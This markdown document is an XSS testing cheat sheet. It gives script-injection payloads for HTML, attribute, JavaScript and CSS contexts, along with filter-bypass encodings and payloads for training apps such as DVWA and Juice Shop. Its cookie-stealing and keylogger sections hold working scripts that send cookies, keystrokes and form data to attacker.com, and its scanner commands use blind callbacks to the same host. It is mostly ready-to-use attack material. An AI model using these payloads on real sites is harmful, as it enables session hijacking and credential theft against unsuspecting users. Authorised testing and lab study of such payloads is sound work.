# XSS Hints & Cheat Sheet

Quick reference for XSS testing, payloads, and filter bypass techniques.

---

## Quick Payloads by Category

### Basic Script Injection

```html
<!-- Classic alert payloads -->
<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Without parentheses (ES6) -->
<script>alert`XSS`</script>
<script>confirm`XSS`</script>
<script>prompt`XSS`</script>

<!-- Using constructor -->
<script>[].constructor.constructor('alert(1)')()</script>
```

### Event Handler Payloads

```html
<!-- Image tag -->
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src=x onerror=alert('XSS')//

<!-- SVG tag -->
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">

<!-- Body tag -->
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>

<!-- Input tag -->
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>

<!-- Other HTML elements -->
<marquee onstart=alert('XSS')>
<video><source onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
```

### URL-Based Payloads

```html
<!-- JavaScript protocol -->
<a href="javascript:alert('XSS')">Click me</a>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')">Click</a>

<!-- Data protocol -->
<a href="data:text/html,<script>alert('XSS')</script>">Click</a>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click</a>

<!-- Iframe with JavaScript -->
<iframe src="javascript:alert('XSS')"></iframe>
<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
```

---

## Context-Specific Payloads

### HTML Context (Between Tags)

```html
<!-- Input: <div>USER_INPUT</div> -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### HTML Attribute Context

```html
<!-- Input: <input value="USER_INPUT"> -->
"><script>alert('XSS')</script>
" onfocus=alert('XSS') autofocus="
" onmouseover=alert('XSS') x="
'><script>alert('XSS')</script>

<!-- Input: <a href="USER_INPUT"> -->
javascript:alert('XSS')
" onclick=alert('XSS')>Click</a><a href="
```

### JavaScript Context

```javascript
// Input: var x = 'USER_INPUT';
'; alert('XSS');//
\'; alert('XSS');//
</script><script>alert('XSS')</script>

// Input: var x = "USER_INPUT";
"; alert('XSS');//
\"; alert('XSS');//

// Input: var x = `USER_INPUT`;
${alert('XSS')}
`; alert('XSS');//
```

### CSS Context

```css
/* Input: background: USER_INPUT; */
url(javascript:alert('XSS'))
expression(alert('XSS'))

/* Input: <style>USER_INPUT</style> */
</style><script>alert('XSS')</script>
```

---

## Filter Bypass Techniques

### Case Variation

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</sCrIpT>
<IMG SRC=x ONERROR=alert('XSS')>
```

### Tag Variations

```html
<!-- No space between tag and attribute -->
<svg/onload=alert('XSS')>
<img/src=x/onerror=alert('XSS')>

<!-- Tab, newline, carriage return -->
<img	src=x	onerror=alert('XSS')>
<img
src=x
onerror=alert('XSS')>

<!-- Forward slash instead of space -->
<svg/onload=alert('XSS')>
```

### Keyword Bypass

```html
<!-- Double keyword (if filter removes once) -->
<scrscriptipt>alert('XSS')</scrscriptipt>
<iimgmg src=x onerror=alert('XSS')>

<!-- Null byte injection -->
<scr%00ipt>alert('XSS')</script>
<scr\x00ipt>alert('XSS')</script>

<!-- Comment injection -->
<scr<!---->ipt>alert('XSS')</script>
```

### Encoding Bypass

```html
<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Double URL encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- HTML entities -->
&lt;script&gt;alert('XSS')&lt;/script&gt;
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- Unicode encoding -->
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>

<!-- Hex encoding -->
<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>

<!-- Octal encoding -->
<script>eval('\141\154\145\162\164\050\047\130\123\123\047\051')</script>

<!-- Mixed encoding -->
<img src=x onerror="\u0061lert('XSS')">
```

### Quote Bypass

```html
<!-- Without quotes -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.domain)>

<!-- Template literals -->
<script>alert`XSS`</script>
<img src=x onerror=alert`XSS`>

<!-- String.fromCharCode -->
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Parentheses Bypass

```html
<!-- Template literals (ES6) -->
<script>alert`XSS`</script>

<!-- onerror with throw -->
<script>onerror=alert;throw 'XSS'</script>

<!-- Using location -->
<script>location='javascript:alert%281%29'</script>

<!-- Using eval -->
<script>eval('ale'+'rt(1)')</script>
```

---

## Platform-Specific Payloads

### DVWA

```html
<!-- Low Security -->
<script>alert('XSS')</script>

<!-- Medium Security (script blocked) -->
<ScRiPt>alert('XSS')</ScRiPt>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- High Security -->
<img src=x onerror="alert('XSS')">
<input onfocus=alert('XSS') autofocus>
<details open ontoggle=alert('XSS')>

<!-- DOM XSS -->
</option></select><img src=x onerror=alert('XSS')>
```

### Juice Shop

```html
<!-- DOM XSS in Search -->
<iframe src="javascript:alert('xss')">
<img src=x onerror=alert('xss')>

<!-- Bonus Payload Challenge -->
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w]<script>alert(`xss`)</script>

<!-- Track Order Reflected XSS -->
<iframe src="javascript:alert('xss')">
```

### bWAPP

```html
<!-- GET/POST Reflected XSS -->
<script>alert('XSS')</script>

<!-- JSON Context -->
"}]}</script><script>alert('XSS')</script>

<!-- Stored Blog XSS -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### WebGoat

```html
<!-- Basic XSS -->
<script>alert('XSS')</script>

<!-- Phone Home -->
<script>webgoat.customjs.phoneHome()</script>

<!-- DOM-based XSS -->
start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>
```

---

## Cookie/Session Stealing Payloads

### Basic Cookie Theft

```html
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<script>new Image().src="http://attacker.com/steal?c="+document.cookie;</script>

<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

<img src=x onerror="this.src='http://attacker.com/steal?c='+document.cookie">

<script>
var i = new Image();
i.src = "http://attacker.com/steal?c=" + encodeURIComponent(document.cookie);
</script>
```

### Using XMLHttpRequest

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://attacker.com/steal?c=' + document.cookie);
xhr.send();
</script>
```

### Using Fetch API

```html
<script>
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: document.cookie
});
</script>
```

---

## Keylogger Payloads

```html
<!-- Basic keylogger -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?key='+e.key;
}
</script>

<!-- Capturing form data -->
<script>
document.forms[0].onsubmit=function(){
  new Image().src='http://attacker.com/log?data='+encodeURIComponent(this.innerHTML);
}
</script>

<!-- Full keylogger with fetch -->
<script>
let keys = '';
document.onkeypress = e => {
  keys += e.key;
  if(keys.length > 10) {
    fetch('http://attacker.com/log?keys=' + encodeURIComponent(keys));
    keys = '';
  }
};
</script>
```

---

## DOM-Based XSS Sinks and Sources

### Common Sources

```javascript
// URL-based sources
document.URL
document.documentURI
document.location
document.location.href
document.location.search
document.location.hash
document.referrer
window.name

// Storage sources
localStorage.getItem()
sessionStorage.getItem()

// Communication sources
window.postMessage()
```

### Common Sinks

```javascript
// Direct execution sinks
eval()
setTimeout()
setInterval()
Function()

// HTML modification sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// DOM manipulation sinks
element.setAttribute()  // with event handlers
element.src
element.href
location.assign()
location.replace()

// jQuery sinks
$(selector).html()
$(selector).append()
$(selector).prepend()
$(userInput)  // selector injection
```

---

## Quick Reference Tables

### Event Handlers by Element

| Element | Event Handlers |
|---------|---------------|
| `<img>` | onerror, onload |
| `<svg>` | onload |
| `<body>` | onload, onpageshow |
| `<input>` | onfocus, onblur, onchange |
| `<video>` | onerror, onloadstart |
| `<audio>` | onerror, onloadstart |
| `<details>` | ontoggle |
| `<marquee>` | onstart, onfinish |
| `<iframe>` | onload |
| `<object>` | onerror |

### Character Encoding Reference

| Character | URL | HTML Entity | Unicode |
|-----------|-----|-------------|---------|
| `<` | %3C | &lt; | \u003C |
| `>` | %3E | &gt; | \u003E |
| `"` | %22 | &quot; | \u0022 |
| `'` | %27 | &#39; | \u0027 |
| `/` | %2F | &#47; | \u002F |
| `(` | %28 | &#40; | \u0028 |
| `)` | %29 | &#41; | \u0029 |

---

## Common Mistakes to Avoid

1. **Forgetting context** - Same payload won't work in all contexts
2. **Not testing variations** - Try both single and double quotes
3. **Ignoring browser differences** - Test on multiple browsers
4. **Not URL encoding** - Always encode payloads in URLs
5. **Missing closing tags** - Can break the payload execution
6. **Forgetting about CSP** - Check for Content Security Policy headers
7. **Not checking for HTTPOnly** - Cookies may not be accessible via JS

---

## Troubleshooting Guide

| Problem | Possible Cause | Solution |
|---------|---------------|----------|
| Payload reflected but not executed | Encoding or filter | Try different encoding |
| Alert not showing | Browser blocking | Check console for CSP errors |
| Cookie stealing fails | HTTPOnly flag | Try other attacks (keylogging) |
| Stored XSS not persisting | Input sanitization | Try encoding or alternative tags |
| DOM XSS not working | Wrong sink/source | Analyze JavaScript code |

---

## Tools Reference

```bash
# XSStrike - Automated XSS scanner
python xsstrike.py -u "http://target.com/search?q=test"
python xsstrike.py -u "http://target.com/search?q=test" --crawl
python xsstrike.py -u "http://target.com/search?q=test" --fuzzer

# Dalfox - Fast XSS scanner
dalfox url "http://target.com/search?q=test"
dalfox url "http://target.com/search?q=test" --blind http://attacker.com
dalfox file urls.txt --blind http://attacker.com

# Burp Suite Intruder
# Load XSS payload list and fuzz parameters

# Browser DevTools
# Console: Test payloads directly
# Network: Monitor requests
# Elements: Inspect DOM changes
```

---

## OWASP References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [OWASP Testing for XSS](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)

## Additional Resources

- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [Brute XSS Cheat Sheet](https://brutelogic.com.br/blog/cheat-sheet/)
